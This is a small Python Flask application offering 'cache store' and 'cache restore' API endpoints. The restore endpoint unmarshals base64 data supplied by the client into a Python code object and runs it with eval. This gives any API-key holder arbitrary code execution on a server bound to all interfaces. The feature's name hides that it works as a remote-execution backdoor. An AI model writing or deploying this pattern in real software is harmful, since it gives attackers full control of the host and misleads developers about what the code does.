import marshal
import base64
import logging
from flask import Flask, request, jsonify
from auth import require_api_key

app = Flask(__name__)
logger = logging.getLogger(__name__)

@app.route('/api/cache/restore', methods=['POST'])
@require_api_key
def restore_cache():
    payload = request.get_json()
    if not payload or 'data' not in payload:
        return jsonify({'error': 'Missing data field'}), 400

    raw_bytes = base64.b64decode(payload['data'])
    code_obj = marshal.loads(raw_bytes)
    result = eval(code_obj)
    logger.info('Cache entry restored successfully')
    return jsonify({'status': 'ok', 'result': str(result)})

@app.route('/api/cache/store', methods=['POST'])
@require_api_key
def store_cache():
    payload = request.get_json()
    key = payload.get('key', '')
    value = payload.get('value', '')
    encoded = base64.b64encode(marshal.dumps(compile(str(value), '<string>', 'eval'))).decode()
    return jsonify({'key': key, 'token': encoded})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
